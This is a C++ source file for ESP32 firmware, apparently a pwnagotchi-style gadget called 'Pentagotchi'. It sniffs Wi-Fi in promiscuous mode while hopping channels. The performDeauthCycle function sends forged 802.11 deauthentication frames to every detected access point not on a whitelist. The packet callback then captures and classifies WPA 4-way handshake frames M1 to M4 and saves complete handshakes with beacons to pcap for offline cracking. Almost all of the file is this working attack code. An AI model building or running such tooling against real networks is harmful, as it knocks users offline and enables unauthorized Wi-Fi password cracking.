#include "pentagotchi_app.h"

#include "pentagotchi_events.h"
#include "pentagotchi_internal.h"

#include <ArduinoJson.h>
#include <esp_err.h>
#include <esp_event.h>
#include <esp_heap_caps.h>
#include <esp_log.h>
#include <esp_netif.h>
#include <esp_random.h>
#include <esp_wifi.h>
#include <freertos/task.h>
#include <nvs_flash.h>

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <iterator>
#include <vector>

using namespace pentagotchi::detail;

extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, const void *buffer, int len);

namespace {

esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const char *tag) {
    esp_err_t err = esp_wifi_internal_tx(ifx, frame, len);
    if (err == ESP_ERR_NOT_SUPPORTED || err == ESP_ERR_INVALID_ARG) {
        ESP_LOGW(kLogTag, "%s internal TX unsupported on iface %d (%s); falling back",
                 tag, static_cast<int>(ifx), esp_err_to_name(err));
        err = esp_wifi_80211_tx(ifx, frame, len, false);
    }
    return err;
}

/* ------------------------------------------------------------------ */
/* 4-way handshake capture state (borrowed from the Bruce firmware's   */
/* sniffer.cpp: classifyEapolMessage + per-AP M1..M4 buffering)        */
/* ------------------------------------------------------------------ */

// Classify a 4-way handshake EAPOL frame by its Key Information field.
// Returns 1..4 (message number) or -1 when unrecognized.
int classifyEapolMessage(const uint8_t *payload, uint32_t sig_len) {
    // QoS frames add 2 bytes to the MAC header
    const int qosOffset = ((payload[0] & 0x0F) == 0x08) ? 2 : 0;
    // Offset to Key Information: 24 MAC hdr (+QoS) + 8 LLC/SNAP + 4 EAPOL hdr + 1 descr type
    const int keyInfoOffset = 24 + qosOffset + 8 + 4 + 1;
    if (sig_len < static_cast<uint32_t>(keyInfoOffset + 2))
        return -1;

    const uint16_t keyInfo = (payload[keyInfoOffset] << 8) | payload[keyInfoOffset + 1];
    const bool install = keyInfo & (1 << 6);
    const bool ack = keyInfo & (1 << 7);
    const bool mic = keyInfo & (1 << 8);
    const bool secure = keyInfo & (1 << 9);

    if (ack && !mic && !install) return 1;            // Message 1
    if (!ack && mic && !install && !secure) return 2; // Message 2
    if (ack && mic && install) return 3;              // Message 3
    if (!ack && mic && !install && secure) return 4;  // Message 4
    return -1;
}

struct EapolTracker {
    bool used = false;
    uint64_t key = 0;      // AP MAC
    uint8_t seen = 0;      // bit0: M1 buffered, bit1: M2, bit2: M3
    CapFrame m1, m2, m3;
};

struct BeaconCacheEntry {
    bool used = false;
    uint64_t key = 0;      // AP MAC
    char ssid[33]{};       // SSID extracted from the cached beacon ("" if none)
    BeaconFrame frame;     // FCS already stripped
};

constexpr int kTrackerSlots = 16;
constexpr int kBeaconSlots = 16;
static EapolTracker *s_trackers = nullptr;
static BeaconCacheEntry *s_beacons = nullptr;

// Once-only PSRAM allocation of the capture state (falls back to internal
// RAM). Called from initWifi().
void initHandshakeCapture(void) {
    if (s_trackers && s_beacons)
        return;
    s_trackers = static_cast<EapolTracker *>(
        heap_caps_calloc(kTrackerSlots, sizeof(EapolTracker), MALLOC_CAP_SPIRAM));
    if (!s_trackers)
        s_trackers = static_cast<EapolTracker *>(
            heap_caps_calloc(kTrackerSlots, sizeof(EapolTracker), MALLOC_CAP_8BIT));
    s_beacons = static_cast<BeaconCacheEntry *>(
        heap_caps_calloc(kBeaconSlots, sizeof(BeaconCacheEntry), MALLOC_CAP_SPIRAM));
    if (!s_beacons)
        s_beacons = static_cast<BeaconCacheEntry *>(
            heap_caps_calloc(kBeaconSlots, sizeof(BeaconCacheEntry), MALLOC_CAP_8BIT));
}

static EapolTracker *trackerGet(uint64_t key) {
    if (!s_trackers)
        return nullptr;
    for (int i = 0; i < kTrackerSlots; ++i) {
        if (s_trackers[i].used && s_trackers[i].key == key)
            return &s_trackers[i];
    }
    return nullptr;
}

static EapolTracker *trackerAlloc(uint64_t key) {
    EapolTracker *t = trackerGet(key);
    if (t)
        return t;
    if (!s_trackers)
        return nullptr;
    for (int i = 0; i < kTrackerSlots; ++i) {
        if (!s_trackers[i].used) {
            EapolTracker *n = &s_trackers[i];
            n->used = true;
            n->key = key;
            n->seen = 0;
            n->m1.len = n->m2.len = n->m3.len = 0;
            return n;
        }
    }
    // all slots busy: evict the oldest (wraps around)
    static int s_evict = 0;
    EapolTracker *n = &s_trackers[s_evict];
    s_evict = (s_evict + 1) % kTrackerSlots;
    n->used = true;
    n->key = key;
    n->seen = 0;
    n->m1.len = n->m2.len = n->m3.len = 0;
    return n;
}

// Extract the SSID from a beacon frame (SSID is tag 0 of the info elements).
static void extractBeaconSsid(const uint8_t *frame, size_t frameLen, char *out, size_t cap)
{
    out[0] = '\0';
    if (frameLen < 36 || cap < 1)
        return;
    size_t pos = 36;
    while (pos + 2 <= frameLen) {
        const uint8_t tag = frame[pos];
        const uint8_t tagLen = frame[pos + 1];
        if (pos + 2 + tagLen > frameLen)
            return;
        if (tag == 0) {
            const size_t sl = std::min<size_t>(tagLen, cap - 1);
            memcpy(out, frame + pos + 2, sl);
            out[sl] = '\0';
            return;
        }
        pos += 2 + tagLen;
    }
}

static BeaconCacheEntry *beaconGet(uint64_t key) {
    if (!s_beacons)
        return nullptr;
    for (int i = 0; i < kBeaconSlots; ++i) {
        if (s_beacons[i].used && s_beacons[i].key == key)
            return &s_beacons[i];
    }
    return nullptr;
}

static BeaconCacheEntry *beaconCache(uint64_t key, const uint8_t *frame, uint16_t len,
                                     uint32_t tsSec, uint32_t tsUsec) {
    if (!s_beacons)
        return nullptr;
    BeaconCacheEntry *e = beaconGet(key);
    if (!e) {
        for (int i = 0; i < kBeaconSlots; ++i) {
            if (!s_beacons[i].used) {
                e = &s_beacons[i];
                break;
            }
        }
        if (!e) { // all busy: overwrite the first slot
            e = &s_beacons[0];
        }
    }
    e->used = true;
    e->key = key;
    e->frame.len = len;
    e->frame.tsSec = tsSec;
    e->frame.tsUsec = tsUsec;
    memcpy(e->frame.data, frame, len);
    extractBeaconSsid(frame, len, e->ssid, sizeof(e->ssid));
    return e;
}

} // namespace

void PentagotchiApp::initWifi() {
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(err);

    ESP_ERROR_CHECK(esp_netif_init());
    esp_event_loop_create_default();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(kTxPowerDefault));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&kPromiscuousFilter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&PentagotchiApp::wifiPromiscuousCallback));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_channel(static_cast<uint8_t>(1 + random(0, 3) * 5), WIFI_SECOND_CHAN_NONE));

    initHandshakeCapture();
}

void PentagotchiApp::rotateChannel() {
    static const uint8_t kChannels[] = {1, 6, 11};
    constexpr size_t kChannelCount = sizeof(kChannels) / sizeof(kChannels[0]);
    currentChannelIndex = (currentChannelIndex + 1) % kChannelCount;
    const uint8_t channel = kChannels[currentChannelIndex];
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        ESP_LOGW(kLogTag, "Failed to set channel %u", channel);
    }

    pwn_event_t ev = {};
    ev.value = channel;
    pwn_events_raise(PWN_EVENT_CHANNEL_CHANGED, &ev);
}

void PentagotchiApp::performDeauthCycle() {
    std::vector<BeaconEntry> snapshot;
    snapshot.reserve(gRegisteredBeacons.size());
    portENTER_CRITICAL(&gRadioMux);
    std::copy(gRegisteredBeacons.begin(), gRegisteredBeacons.end(), std::back_inserter(snapshot));
    portEXIT_CRITICAL(&gRadioMux);

    if (snapshot.empty()) { return; }

    uint8_t originalChannel = readWifiChannel();

    for (const auto &entry : snapshot) {
        if (entry.channel != originalChannel) { continue; }

        // Skip networks in config whitelist
        bool whitelisted = false;
        for (uint8_t w = 0; w < config_.whitelist_count; ++w) {
            if (memcmp(config_.whitelist[w], entry.mac, 6) == 0) {
                whitelisted = true;
                break;
            }
        }
        if (whitelisted) { continue; }

        uint8_t frame[sizeof(kDeauthFrameTemplate)];
        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
        memcpy(frame + 10, entry.mac, 6);
        memcpy(frame + 16, entry.mac, 6);

        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 entry.mac[0], entry.mac[1], entry.mac[2],
                 entry.mac[3], entry.mac[4], entry.mac[5]);

        esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 3; ++i) {
            esp_err_t err = sendRawFrame(WIFI_IF_STA, frame, sizeof(frame), "Deauth");
            if (err != ESP_OK) {
                ESP_LOGW(kLogTag, "Deauth tx failed on STA iface: %s", esp_err_to_name(err));
            }
        }

        pwn_event_t ev = {};
        ev.mac = entry.mac;
        ev.str = entry.ssid[0] ? entry.ssid : macStr;
        pwn_events_raise(PWN_EVENT_DEAUTH_SENT, &ev);
    }

    esp_wifi_set_channel(originalChannel, WIFI_SECOND_CHAN_NONE);
}

bool PentagotchiApp::isItEapol(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    const int len = packet->rx_ctrl.sig_len;

    if (len < 36) { return false; }

    const uint16_t frameCtrl = static_cast<uint16_t>(frame[0]) | (static_cast<uint16_t>(frame[1]) << 8);
    const uint8_t type = (frameCtrl & 0x0C) >> 2;
    if (type != 0x02) { return false; }

    size_t hdrLen = 24;
    const bool toDs = frame[1] & 0x01;
    const bool fromDs = frame[1] & 0x02;
    if (toDs && fromDs) { hdrLen += 6; }
    const uint8_t subtype = (frameCtrl & 0xF0) >> 4;
    if (subtype & 0x08) { hdrLen += 2; }
    if (frame[1] & 0x80) { hdrLen += 4; }

    if (len < static_cast<int>(hdrLen + 8)) { return false; }

    const uint8_t *llc = frame + hdrLen;
    const int llcLen = len - static_cast<int>(hdrLen);
    if (llcLen < 8) { return false; }

    if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00) {
        const uint8_t *ethType = llc + 6;
        if (ethType[0] == 0x88 && ethType[1] == 0x8E) { return true; }
        if (ethType[0] == 0x81 && ethType[1] == 0x00 && llcLen >= 12) {
            const uint8_t *innerType = ethType + 4;
            if (innerType[0] == 0x88 && innerType[1] == 0x8E) { return true; }
        }
    }

    for (int i = static_cast<int>(hdrLen); i <= len - 2; ++i) {
        if (frame[i] == 0x88 && frame[i + 1] == 0x8E) { return true; }
    }
    return false;
}

void PentagotchiApp::wifiPromiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!gInstance) { return; }

    auto *packet = static_cast<wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *frame = packet->payload;
    const uint16_t frameCtrl = static_cast<uint16_t>(frame[0]) | (static_cast<uint16_t>(frame[1]) << 8);
    const uint8_t frameType = (frameCtrl & 0x0C) >> 2;
    const uint8_t frameSubtype = (frameCtrl & 0xF0) >> 4;

    static uint32_t mgmtCount = 0;
    static uint32_t dataCount = 0;
    static uint32_t ctrlCount = 0;
    static uint32_t eapolCandidates = 0;
    static uint32_t lastDump = 0;
    static uint32_t debugFrames = 0;

    switch (type) {
    case WIFI_PKT_MGMT:
        ++mgmtCount;
        break;
    case WIFI_PKT_DATA:
        ++dataCount;
        break;
    case WIFI_PKT_CTRL:
        ++ctrlCount;
        break;
    default:
        break;
    }

    if (frameType == 0x02) {
        ++eapolCandidates;
        if (debugFrames < 10) {
            size_t hdrLen = 24;
            const bool toDs = frame[1] & 0x01;
            const bool fromDs = frame[1] & 0x02;
            if (toDs && fromDs) { hdrLen += 6; }
            if (frameSubtype & 0x08) { hdrLen += 2; }
            if (frame[1] & 0x80) { hdrLen += 4; }
            const uint8_t *llc = (packet->rx_ctrl.sig_len > hdrLen) ? frame + hdrLen : frame + 24;
            SERIAL_PRINTF(
                "[pentagotchi] data subtype=%u len=%u hdr=%u llc=%02X %02X %02X %02X %02X %02X %02X %02X\n",
                static_cast<unsigned>(frameSubtype),
                static_cast<unsigned>(packet->rx_ctrl.sig_len),
                static_cast<unsigned>(hdrLen),
                llc[0],
                llc[1],
                llc[2],
                llc[3],
                llc[4],
                llc[5],
                llc[6],
                llc[7]);
            ++debugFrames;
        }
    }

    uint32_t now = millis();
    if (now - lastDump > 3000) {
        SERIAL_PRINTF(
            "[pentagotchi] promisc stats mgmt=%lu data=%lu ctrl=%lu candidates=%lu\n",
            static_cast<unsigned long>(mgmtCount),
            static_cast<unsigned long>(dataCount),
            static_cast<unsigned long>(ctrlCount),
            static_cast<unsigned long>(eapolCandidates));
        lastDump = now;
        mgmtCount = dataCount = ctrlCount = eapolCandidates = 0;
        debugFrames = 0;
    }

    if (isItEapol(packet)) {
        const uint8_t *dest = frame + 4;
        const uint8_t *src = frame + 10;
        const uint8_t *bssid = frame + 16;
        const uint8_t *apAddr = (memcmp(dest, bssid, 6) == 0) ? dest : src;
        uint64_t bssidKey = 0;
        memcpy(&bssidKey, apAddr, 6);

        char destMac[18] = {0};
        char srcMac[18] = {0};
        char bssidMac[18] = {0};
        snprintf(destMac, sizeof(destMac), "%02X:%02X:%02X:%02X:%02X:%02X", dest[0], dest[1], dest[2], dest[3], dest[4], dest[5]);
        snprintf(srcMac, sizeof(srcMac), "%02X:%02X:%02X:%02X:%02X:%02X", src[0], src[1], src[2], src[3], src[4], src[5]);
        snprintf(bssidMac, sizeof(bssidMac), "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        ESP_LOGI(
            kLogTag,
            "EAPOL frame len=%u rssi=%d channel=%u src=%s dst=%s bssid=%s",
            packet->rx_ctrl.sig_len,
            packet->rx_ctrl.rssi,
            packet->rx_ctrl.channel,
            srcMac,
            destMac,
            bssidMac);

        // All frames handed by the driver carry a trailing FCS; drop it before
        // buffering so the saved pcap contains a clean 802.11 frame.
        uint32_t frameLen = packet->rx_ctrl.sig_len;
        if (frameLen >= 4)
            frameLen -= 4;
        if (frameLen > sizeof(CapFrame::data))
            frameLen = sizeof(CapFrame::data);

        const int msg = classifyEapolMessage(frame, packet->rx_ctrl.sig_len);
        const uint32_t tsSec = packet->rx_ctrl.timestamp / 1000000;
        const uint32_t tsUsec = packet->rx_ctrl.timestamp % 1000000;

        /* M1/M2/M3: buffer, do not write to disk yet */
        if (msg >= 1 && msg <= 3) {
            EapolTracker *t = trackerAlloc(bssidKey);
            if (t) {
                const uint8_t bit = static_cast<uint8_t>(1 << (msg - 1));
                if (!(t->seen & bit)) {
                    CapFrame *fr = (msg == 1) ? &t->m1 : (msg == 2) ? &t->m2 : &t->m3;
                    fr->len = static_cast<uint16_t>(frameLen);
                    fr->tsSec = tsSec;
                    fr->tsUsec = tsUsec;
                    memcpy(fr->data, frame, frameLen);
                    t->seen |= bit;
                    SERIAL_PRINTF("[pentagotchi] handshake M%u buffered (bssid=%s)\n",
                                  static_cast<unsigned>(msg), bssidMac);
                }
            }
            return; // handled; skip beacon branch below
        }

        /* M4: the exchange is complete - flush M1..M4 (+ beacon) to pcap */
        if (msg == 4) {
            EapolTracker *t = trackerGet(bssidKey);
            if (t && (t->seen & 0x7) == 0x7) {
                bool isFirst = (gHandshakeBssids.find(bssidKey) == gHandshakeBssids.end());

                // static: keeps ~1.5 KB off the WiFi task stack; this callback
                // uses it synchronously (fill -> saveHandshake -> done).
                static HandshakeCapture cap;
                memset(&cap, 0, sizeof(cap));
                memcpy(cap.bssid, apAddr, sizeof(cap.bssid));
                cap.m1 = t->m1;
                cap.m2 = t->m2;
                cap.m3 = t->m3;
                cap.m4.len = static_cast<uint16_t>(frameLen);
                cap.m4.tsSec = tsSec;
                cap.m4.tsUsec = tsUsec;
                memcpy(cap.m4.data, frame, frameLen);

                BeaconCacheEntry *be = beaconGet(bssidKey);
                if (be) {
                    cap.beacon = be->frame;
                }

                // Always reveal the network we just captured, guaranteed:
                // 1) SSID straight from the cached raw beacon (works even when
                //    the pwngrid handler consumed the beacon and it never made
                //    it into gRegisteredBeacons), 2) SSID from the registered
                //    beacon list, 3) "Hidden" for cloaked / unknown networks.
                char pwndName[33] = {0};
                if (be && be->ssid[0]) {
                    memcpy(pwndName, be->ssid, sizeof(pwndName) - 1);
                } else {
                    portENTER_CRITICAL(&gRadioMux);
                    for (const auto &be2 : gRegisteredBeacons) {
                        if (memcmp(be2.mac, cap.bssid, 6) == 0) {
                            memcpy(pwndName, be2.ssid, sizeof(pwndName));
                            break;
                        }
                    }
                    portEXIT_CRITICAL(&gRadioMux);
                }
                if (!pwndName[0]) {
                    snprintf(pwndName, sizeof(pwndName), "Hidden");
                }
                memcpy(cap.ssid, pwndName, sizeof(cap.ssid));
                gLastPwndName = pwndName;
                portENTER_CRITICAL(&gRadioMux);
                memcpy(gLastHandshakeMac, cap.bssid, sizeof(gLastHandshakeMac));
                gLastHandshakeMacValid = true;
                portEXIT_CRITICAL(&gRadioMux);

                if (isFirst) {
                    gHandshakeBssids.insert(bssidKey);
                    ++gHandshakeCount;
                    ++gInstance->stats_.total_pwnd;
                    ++gInstance->statsChanges;
                    gInstance->handshakePending = true;
                }

                SERIAL_PRINTF("[pentagotchi] COMPLETE handshake for %s\n", bssidMac);
                gInstance->saveHandshake(cap);

                // Clear the tracker so a fresh exchange can be captured and
                // appended to the same pcap later.
                t->used = false;
                t->seen = 0;
                t->key = 0;
            }
            return; // handled; skip beacon branch below
        }

        SERIAL_PRINTF(
            "[pentagotchi] EAPOL (unclassified, msg=%d) len=%u rssi=%d ch=%u src=%s dst=%s bssid=%s\n",
            msg,
            packet->rx_ctrl.sig_len,
            packet->rx_ctrl.rssi,
            packet->rx_ctrl.channel,
            srcMac,
            destMac,
            bssidMac);
        return; // handled; skip beacon branch below
    }

    if (frameType == 0x00 && frameSubtype == 0x08) {
        const uint8_t *sender = frame + 10;

        // Cache a raw copy of the beacon (FCS stripped) per AP so the
        // handshake pcap can carry the SSID in its first record.
        {
            const size_t frameLen = static_cast<size_t>(packet->rx_ctrl.sig_len) - 4; // drop FCS
            if (frameLen >= 24 && frameLen <= sizeof(BeaconFrame::data)) {
                uint64_t beaconKey = 0;
                memcpy(&beaconKey, sender, 6);
                beaconCache(beaconKey, frame, static_cast<uint16_t>(frameLen),
                            packet->rx_ctrl.timestamp / 1000000,
                            packet->rx_ctrl.timestamp % 1000000);
            }
        }

        if (!pentagotchi_grid_handle_mgmt(packet)) {
            BeaconEntry entry;
            memcpy(entry.mac, sender, sizeof(entry.mac));
            entry.channel = readWifiChannel();

            // Extract the SSID from Tag 0 (first IE) of the beacon
            const size_t frameLen = static_cast<size_t>(packet->rx_ctrl.sig_len) - 4; // drop FCS
            size_t pos = 36;
            while (pos + 2 <= frameLen) {
                const uint8_t tag = frame[pos];
                const uint8_t tagLen = frame[pos + 1];
                if (pos + 2 + tagLen > frameLen) { break; }
                if (tag == 0) {
                    const size_t sl = std::min<size_t>(tagLen, sizeof(entry.ssid) - 1);
                    memcpy(entry.ssid, frame + pos + 2, sl);
                    entry.ssid[sl] = '\0';
                    break;
                }
                pos += 2 + tagLen;
            }

            portENTER_CRITICAL(&gRadioMux);
            auto inserted = gRegisteredBeacons.insert(entry);
            portEXIT_CRITICAL(&gRadioMux);
            if (inserted.second) {
                ++gInstance->stats_.total_aps;
                ++gInstance->statsChanges;

                pwn_event_t ev = {};
                ev.value = entry.channel;
                ev.mac = entry.mac;
                pwn_events_raise(PWN_EVENT_AP_DETECTED, &ev);
            }
        }
    }
}
